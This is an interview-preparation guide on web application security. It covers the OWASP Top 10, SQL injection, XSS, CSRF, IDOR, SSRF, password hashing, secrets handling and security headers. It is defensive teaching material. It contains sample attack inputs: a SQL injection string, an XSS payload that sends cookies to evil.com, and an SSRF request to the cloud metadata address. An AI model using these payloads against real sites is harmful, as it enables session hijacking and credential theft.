# 🔐 Web Application Security (OWASP) Interview Preparation

## Basics

### ❓ What is the OWASP Top 10?

The OWASP Top 10 is a widely used list of the most critical web application security risks, published by the OWASP foundation and updated every few years. Teams use it as a checklist for secure coding, code review and security testing.

The current list is the **2025 edition** (the 8th):

1. **Broken access control** — users reach data or actions they shouldn't (now also covers SSRF).
2. **Security misconfiguration** — default passwords, open admin pages, verbose errors.
3. **Software supply chain failures** — vulnerable or tampered libraries, build tools and pipelines (new).
4. **Cryptographic failures** — sensitive data unencrypted or weakly encrypted.
5. **Injection** — SQL, NoSQL, OS command injection, XSS.
6. **Insecure design** — missing security thinking in the design itself.
7. **Authentication failures** — weak login, password and session handling.
8. **Software or data integrity failures** — trusting unverified updates, data or plugins.
9. **Security logging and alerting failures** — attacks go unnoticed.
10. **Mishandling of exceptional conditions** — errors that fail open or leak details (new).

Compared with 2021: supply chain and error handling are new; SSRF was merged into broken access control.

---

### ❓ What is the difference between authentication and authorization?

**Authentication** proves *who* you are (login, OTP, fingerprint). **Authorization** decides *what* you may do once logged in.

- Fails authentication → **401 Unauthorized**.
- Authenticated but not allowed → **403 Forbidden**.

**Example:** you log in to the HR portal (authentication); you can see your own payslip but not your manager's (authorization).

---

## Common Attacks & Fixes

### ❓ What is SQL injection and how do you prevent it?

**Level:** 🟢 Beginner

SQL injection happens when user input is pasted into a SQL query, so the input can change the query itself.

```java
// ❌ Vulnerable: input "' OR '1'='1" returns every user
String sql = "SELECT * FROM users WHERE email = '" + email + "'";

// ✅ Safe: the value is sent separately and never treated as SQL
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE email = ?");
ps.setString(1, email);
```

- Always use **parameterised queries** (JPA/Hibernate parameters, `PreparedStatement`).
- Give the app's database user only the permissions it needs.
- Validate input types and lengths as an extra layer — not as the main fix.

---

### ❓ What is XSS (Cross-Site Scripting) and how do you prevent it?

**Level:** 🟡 Intermediate

XSS lets an attacker run their JavaScript in another user's browser, usually by saving a script in data the site later shows (a comment, a profile name). The script can steal session tokens or act as the user.

- **Escape output** for the context where it appears (HTML, attribute, URL, JavaScript). Angular and React escape by default — avoid `innerHTML` / `dangerouslySetInnerHTML` with user data.
- Sanitise rich text with a library like DOMPurify.
- Add a **Content-Security-Policy** header so injected inline scripts don't run.
- Mark session cookies `HttpOnly` so scripts can't read them.

**Example:** a comment `<script>fetch('//evil.com?c='+document.cookie)</script>` shown unescaped steals every reader's cookie.

---

### ❓ What is CSRF and how do you prevent it?

**Level:** 🟢 Beginner

Cross-Site Request Forgery tricks a logged-in user's browser into sending a request they didn't intend — the browser attaches their cookies automatically.

- Use **CSRF tokens** in forms (Spring Security enables this by default for cookie sessions).
- Set cookies with **`SameSite=Lax` or `Strict`** so other sites can't send them.
- Never change data with GET requests.
- APIs that use a bearer token in the `Authorization` header (not cookies) aren't exposed to classic CSRF.

**Example:** a hidden form on `evil.com` posts to `bank.com/transfer` while you are logged in to the bank.

---

### ❓ What is broken access control? Give an example.

**Level:** 🟡 Intermediate

The app checks that you are logged in but not that the data or action belongs to you. It is number 1 on the OWASP Top 10.

**Example (IDOR — insecure direct object reference):** `GET /api/orders/1043` returns order 1043 to any logged-in user, so changing the number shows other customers' orders.

**Fix:** check ownership on the server for every request:

```java
Order order = orderRepo.findById(id).orElseThrow();
if (!order.getCustomerId().equals(currentUser.getId())) throw new AccessDeniedException("Not yours");
```

Deny by default, check permissions in one place (e.g. Spring Security `@PreAuthorize`), and never trust IDs or roles sent by the client.

---

### ❓ What is SSRF (Server-Side Request Forgery)?

**Level:** 🟡 Intermediate

SSRF tricks your server into making a request to a place the attacker chooses — often internal systems the attacker can't reach directly. In the 2025 OWASP Top 10 it is part of broken access control.

**Example:** an "import image from URL" feature is given `http://169.254.169.254/latest/meta-data/` — the cloud metadata address — and leaks the server's cloud credentials.

**Fix:** allow-list the domains the server may call, block private and link-local IP ranges, and use IMDSv2 on AWS (requires a token, which blocks most SSRF).

---

## Data Protection

### ❓ How should passwords be stored?

**Level:** 🟡 Intermediate

Never store passwords as plain text or with fast hashes like MD5 or SHA-256. Use a slow, salted password hash so stolen hashes are expensive to crack.

- Use **bcrypt**, **scrypt** or **Argon2** (Spring Security: `BCryptPasswordEncoder`).
- A random **salt** per password stops identical passwords from having identical hashes.
- Check logins with the library's compare function; never decrypt.

```java
String hash = passwordEncoder.encode(rawPassword);       // on sign-up
boolean ok = passwordEncoder.matches(rawPassword, hash);  // on login
```

---

### ❓ What is the difference between encryption, hashing and encoding?

**Level:** 🟡 Intermediate

| | Reversible? | Purpose | Example |
|---|---|---|---|
| **Encoding** | Yes, by anyone | Change format for transport | Base64, URL encoding |
| **Encryption** | Yes, with the key | Keep data secret | AES for data, TLS for traffic |
| **Hashing** | No | Verify data or passwords | bcrypt for passwords, SHA-256 for file checks |

A common mistake: thinking Base64 is "encryption" — anyone can decode it.

---

### ❓ How do you handle secrets like API keys and DB passwords?

**Level:** 🟡 Intermediate

- Never commit them to Git — scan repositories with tools like gitleaks; rotate any secret that was ever committed.
- Store them in a **secrets manager** (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault) or the platform's secret store, and inject them at runtime.
- Give each service its own credentials with the least privilege, and rotate them regularly.

**Example:** Spring Boot reads `DB_PASSWORD` from an environment variable filled by Kubernetes Secrets, not from `application.yml` in Git.

---

## Secure Development

### ❓ What security headers should a web app send?

**Level:** 🟡 Intermediate

| Header | What it does |
|---|---|
| `Strict-Transport-Security` | Forces HTTPS for future visits |
| `Content-Security-Policy` | Limits where scripts, styles and images can load from — blocks most XSS |
| `X-Content-Type-Options: nosniff` | Stops the browser guessing file types |
| `X-Frame-Options: DENY` (or CSP `frame-ancestors`) | Prevents clickjacking in iframes |
| `Referrer-Policy` | Limits what URL information is sent to other sites |

Cookies: `Secure; HttpOnly; SameSite=Lax`.

---

### ❓ How do you keep third-party libraries secure?

**Level:** 🟡 Intermediate

Most code in an app is libraries, and known vulnerabilities (CVEs) in them are a top attack path — Log4Shell (CVE-2021-44228) is the famous example. "Software supply chain failures" is now #3 in the OWASP Top 10.

- Scan dependencies in CI: OWASP Dependency-Check, Snyk, GitHub Dependabot, `npm audit`.
- Keep versions current and remove unused libraries.
- Use a lock file and a trusted registry so builds use exactly the versions you reviewed.

---

### ❓ What is the difference between SAST, DAST and penetration testing?

**Level:** 🟡 Intermediate

- **SAST** scans source code for insecure patterns without running it (SonarQube, Semgrep) — early, in CI.
- **DAST** attacks the running app from outside (OWASP ZAP, Burp Suite) — finds misconfiguration and runtime issues.
- **Penetration testing** is a human expert attacking the system with permission, chaining weaknesses together like a real attacker.

Use all three: SAST on every commit, DAST on staging, pen tests before major releases or yearly.

---

### ❓ What does "least privilege" mean in practice?

**Level:** 🟡 Intermediate

Give every user, service and token only the access it needs, for only as long as it needs it. Then a stolen credential or bug can do limited damage.

**Examples:** the app's DB user can't drop tables; a CI token can deploy only one service; AWS IAM roles list specific actions and resources instead of `*`; admin access expires after the task.
